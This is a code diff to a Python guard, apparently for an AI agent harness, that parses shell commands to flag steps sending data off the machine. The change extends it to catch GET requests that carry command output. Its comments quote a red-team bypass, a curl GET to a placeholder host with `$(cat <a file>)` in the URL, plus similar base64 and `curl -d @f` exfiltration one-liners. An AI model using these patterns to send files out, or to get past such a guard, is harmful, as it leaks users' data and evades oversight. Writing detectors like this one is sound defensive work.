@@ -63,7 +63,7 @@ _PS, _PIE = {'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm'}, {'http', '
 # each client's own grammar for a write: curl's short flags are case-sensitive (-F a form post, -f --fail) and bundle (`-sXPOST`, `-sd x`) - the
 # letters that take a value end a bundle; a long option that sends a body starts with one of these; -K/--config sends what a file it reads says
 _CURL_VAL = 'AbcCdDeEFHKmoPQrtTuUwxXyYz'
-_BODY = ('--data', '--form', '--upload', '--post-', '--body-', '--json', '--raw', '--config')
+_BODY = ('--data', '--form', '--upload', '--post-', '--body-', '--json', '--raw', '--config', '--url-query')
 _PIE_VAL = 'aAop'
 _VERBS = {'get', 'head', 'options', 'post', 'put', 'patch', 'delete'}
 # the programs whose own grammar says a step goes out - what a launcher (`timeout 60 git push`) is read through to (browsergate.launched)
@@ -97,11 +97,64 @@ def _words(argv: list) -> tuple:
     return tool, out
 
 
-def _http_write(argv: list, own: bool = False) -> str:
+# A READ THAT CARRIES WHAT THE LINE READ IS A SEND (red team round 6: `curl "https://<host>/collect/$(cat <a file>)"` - a GET, so nobody's
+# to hold - took the file out in its address). By the shell's grammar, never the words: a word of the client's line that a command fills in
+# as the line runs (`$(...)`, a backtick, `<(...)`), or a variable the LINE ITSELF set from one (`x=$(base64 f); curl ...?d=$x`, `read l`,
+# a loop over a command's output) - and words handed in by xargs. A literal address, a variable the line set to plain words, one from the
+# environment and the file a download is written to are a read, as ever
+_RUNS_IN = re.compile(r'\$\(|`|<\(|\$$')
+_VARREF = re.compile(r'\$\{?(?:env:)?([A-Za-z_]\w*)|%([A-Za-z_]\w*)%', re.I)
+_ASSIGN = re.compile(r'^(\$)?(?:env:)?([A-Za-z_]\w*)=(.*)$', re.S)
+_SETTERS = ('export', 'declare', 'local', 'readonly', 'typeset', 'set')
+_FEEDS = ('xargs', 'parallel')
+# ...each client's options that name a local file it WRITES (never a word that goes out): long ones, and the letters of a short bundle
+_SAVES = {'curl': ({'--output', '--output-dir', '--dump-header', '--cookie-jar', '--trace', '--trace-ascii', '--stderr', '--write-out'}, 'oDcw'),
+          'wget': ({'--output-document', '--output-file', '--append-output', '--directory-prefix'}, 'OoaP')}
+
+
+def _moving(t: str, taken: set) -> bool:
+    "Is word `t` filled in as the line runs - by a command, or by a variable the line set from one (`taken`)?"
+    return bool(_RUNS_IN.search(t)) or any((m[1] or m[2]).lower() in taken for m in _VARREF.finditer(t))
+
+
+def _takes(argv: list, taken: set) -> None:
+    "Note in `taken` the variables this simple command sets from anything but plain words: `x=$(...)`, `$x = Get-Content f`, `read x`, `for x in $(...)`."
+    a = [str(t) for t in argv]
+    while a and (a[0] in ('do', 'then', 'else', '{', 'while', 'until', 'if', '!') or a[0].lower() in _SETTERS or (a[0].startswith('-') and len(a) > 1)): a = a[1:]
+    if not a: return
+    # ...once taken, taken for the rest of the line: a later `x=plain` may sit behind a test that never runs it (`false && x=ok`)
+    note = lambda n, moved: taken.add(n.lower()) if moved else None
+    if a[0].lower() in ('read', 'mapfile', 'readarray'): [note(t, True) for t in a[1:] if re.fullmatch(r'[A-Za-z_]\w*', t)]
+    elif a[0].lower() in ('for', 'foreach') and len(a) > 3: note(a[1].lstrip('$('), any(_moving(t, taken) for t in a[3:]))
+    elif (m := re.fullmatch(r'\$(?:env:)?([A-Za-z_]\w*)', a[0], re.I)) and a[1:2] == ['=']: note(m[1], len(a) != 3 or _moving(a[2], taken))
+    else:
+        for i, t in enumerate(a):
+            if not (m := _ASSIGN.match(t)): break
+            # ...PowerShell's `$x=Get-Content f` is the command's output: more words after it are what filled it
+            note(m[2], _moving(m[3], taken) or (bool(m[1]) and i + 1 < len(a)))
+
+
+def _rides(tool: str, a: list, taken: set) -> bool:
+    "Does a word of this client's line - its address, a header, any option's value but the file it saves to - carry what the line read?"
+    longs, shorts = _SAVES.get(tool, (set(), ''))
+    skip = False
+    for t in a:
+        if skip: skip = False; continue
+        k = t.split('=', 1)[0].split(':', 1)[0].lower()
+        if k in longs or (tool in _PIE and k in ('-o', '--output', '--download')) or (tool in _PS and len(k) > 2 and 'outfile'.startswith(k[1:])):
+            skip = '=' not in t and ':' not in t; continue
+        if shorts and re.fullmatch(r'-[A-Za-z0-9#]+', t) and t[-1] in shorts: skip = True; continue
+        if shorts and re.match(r'-[A-Za-z]', t) and not t.startswith('--') and any(c in shorts for c in t[1:2]): continue      # `-o$f`: its value on it
+        if _moving(_OWN.sub('', t), taken): return True
+    return False
+
+
+def _http_write(argv: list, own: bool = False, taken=frozenset(), fed: bool = False) -> str:
     """'' unless this HTTP client writes to a host off this machine - then what it does, in words. Read by each client's own grammar: its
     method option (`-X`, `--request`, `--method`, PowerShell's `-Method` however abbreviated or `-Method:Post`), an option that sends a body,
     and httpie's / xh's own `[METHOD] URL item=value`. Taskuary's own API answers its own guard - `own`: $TASKUARY_URL is Taskuary's (nothing
-    in the command set it)."""
+    in the command set it). A read whose words carry what the line itself read is a send too (_rides; `taken`: the variables the line
+    filled from a command, `fed`: its words come from xargs)."""
     tool, a = _name(argv[0]), [str(t) for t in argv[1:]]
     meth, data, pos, i = '', False, [], 0
     while i < len(a):
@@ -111,6 +164,7 @@ def _http_write(argv: list, own: bool = False) -> str:
             k = k.lower()
             if k in ('--request', '--method'): meth = v if eq else nxt; i += not eq
             elif k.startswith(_BODY) or (tool in _PIE and k == '--form'): data = True
+            elif k == '--header' and (v if eq else nxt).startswith('@'): data = True         # ...curl sends a file's lines as headers
         elif t.startswith('-') and len(t) > 1 and tool in _PS:
             k, col, v = t[1:].partition(':')
             k = k.lower()
@@ -118,7 +172,7 @@ def _http_write(argv: list, own: bool = False) -> str:
             elif len(k) > 1 and ('body'.startswith(k) or 'infile'.startswith(k)): data = True
         elif t.startswith('-') and len(t) > 1 and tool == 'curl':
             for j, c in enumerate(t[1:], 1):
-                if c in 'dFTK': data = True
+                if c in 'dFTK' or (c == 'H' and (t[j + 1:] or nxt).startswith('@')): data = True
                 if c == 'X': meth = t[j + 1:] or nxt
                 if c in _CURL_VAL:
                     i += j == len(t) - 1; break
@@ -133,8 +187,8 @@ def _http_write(argv: list, own: bool = False) -> str:
         urls = [u if re.match(r'^https?://', u, re.I) or (own and _OWN.match(u)) else 'http://' + ('localhost' + u if u.startswith(':') else u)]
         data = data or any(re.match(r'^[^:=@]*(:=|=(?!=)|@)', x) for x in pos[1:])
     if urls and all(_LOCAL.match(u) or (own and _OWN.match(u)) for u in urls): return ''
-    if meth.lower() not in _WRITES and not data: return ''
-    host = re.sub(r'^https?://([^/?#]+).*', r'\1', urls[0]) if urls else 'a web address'
+    if meth.lower() not in _WRITES and not data and not fed and not _rides(tool, a, taken): return ''
+    host = (re.sub(r'^https?://([^/?#$`%]+).*', r'\1', urls[0], flags=re.S) if urls else '') or 'a web address'
     return f'send data to {host} ({tool})'
 
 
@@ -308,6 +362,17 @@ def acts(cmd: str, cwd: str = '') -> list:
     return _outward(cmd) + deletes(cmd, cwd)
 
 
+def _inner(t: str) -> list:
+    """The commands one word runs as the line does: each outermost `$(...)`'s text. Never a backtick's: in a message's words it is how code
+    is written (`gh pr create --body '... `git push` ...'`), and the quotes that would tell the two apart are gone by here."""
+    out, i = [], 0
+    while (i := t.find('$(', i)) >= 0:
+        depth, j = 1, i + 2
+        while j < len(t) and depth: depth += (t[j] == '(') - (t[j] == ')'); j += 1
+        out.append(t[i + 2:j - 1 if not depth else j]); i = j
+    return [x for x in out if x.strip()]
+
+
 def _outward(cmd: str, own: bool = True, comments: bool = True) -> list:
     """Every step in a shell command that goes out: [{'tool', 'what', 'why', 'command'}]. A command that cannot be read and names one of
     these tools is one step - held, never let through for being hard to read. `comments` False: a line handed to cmd.exe, which has no `#`."""
@@ -315,16 +380,30 @@ def _outward(cmd: str, own: bool = True, comments: bool = True) -> list:
     low = joined(raw)
     own = own and not _SETS_OWN.search(raw)
     if not any(w in low for w in ('git', 'gh', 'glab', 'publish', 'push', 'upload', 'mail', 'mutt', 'msmtp', 'http', 'curl', 'wget', 'xh', 'iwr', 'irm',
-                                  'invoke-')): return []      # the cheap test first
+                                  'invoke-', 'agent-browser')): return []      # the cheap test first
     segs = _segments(raw, comments)
     if segs is None:
-        import re
         return [{'tool': '?', 'kind': 'out', 'what': 'run a command that may push, publish or send', 'why': OUT, 'command': raw[:400]}] if re.search(
             r'\b(git\s+push|gh\s+(pr|issue|release|repo|api)|glab|publish|sendmail|send-mailmessage)\b', low) else []
-    out, moved = [], False
+    from .browsergate import EXE, VALUED, _dest, _head
+    out, moved, taken = [], False, set()
     for argv in segs:
+        _takes(argv, taken)
+        # ...a step behind PowerShell's `$r = ` is that step (`$r = Invoke-RestMethod -Method Post ...` was read as a call of `$r`)
+        if len(argv) > 2 and argv[1] == '=' and re.fullmatch(r'\$[\w:]+', argv[0]): argv = argv[2:]
+        # ...and a command run inside a word (`echo "$(curl -d @f <host>)"`) is a command of this line, read as one
+        for t in argv:
+            for inner in _inner(t): out += _outward(inner, own, comments)
         whole, argv = argv, launched(argv, lambda t: _name(t) in _TOOLS)   # `timeout 60 git push` is git's push, read as git's - its env still aims it
         tool, w = _words(argv)
+        # ...the agent's browser is a way out as curl is: an address it is sent to that carries what the line read (_rides' rule)
+        if (b := _head(whole)) is not None:
+            i = 0
+            while i < len(b) and b[i].startswith('-'): i += 2 if b[i] in VALUED and '=' not in b[i] else 1
+            if (to := _dest(b, i)) and _moving(to, taken):
+                host = re.sub(r'^(?:https?://)?([^/?#$`%]*).*', r'\1', to, flags=re.S) or 'a web address'
+                out.append({'tool': EXE, 'kind': 'out', 'what': f'send data to {host} ({EXE})', 'why': OUT, 'command': ' '.join(whole)[:400], 'to': '?'})
+            continue
         if tool in MOVES: moved = True
         if tool in ('bash', 'sh', 'powershell', 'pwsh', 'cmd'):                 # `bash -c "git push"`: the string is a command of its own
             for t in argv[1:]:
@@ -336,7 +415,7 @@ def _outward(cmd: str, own: bool = True, comments: bool = True) -> list:
                 or (tool == 'docker' and w[:1] == ['push']) else MAIL.get(tool))
         if not what and tool in ('gh', 'glab') and w[:1] == ['api'] and _api_writes(argv): what = 'change something on the code host through its API'
         if not what and tool == 'git' and w[:1] == ['push']: what = GIT['push']
-        if not what and tool in HTTP: what = _http_write(argv, own)
+        if not what and tool in HTTP: what = _http_write(argv, own, taken, any(_name(t) in _FEEDS for t in whole[:len(whole) - len(argv)]))
         if what: out.append({'tool': tool, 'kind': 'out', 'what': what, 'why': OUT, 'command': ' '.join(argv)[:400], 'to': '?' if moved else _to(tool, whole, w),
                              **({'refs': w[2:]} if tool == 'git' and w[:1] == ['push'] else {})})
     return out
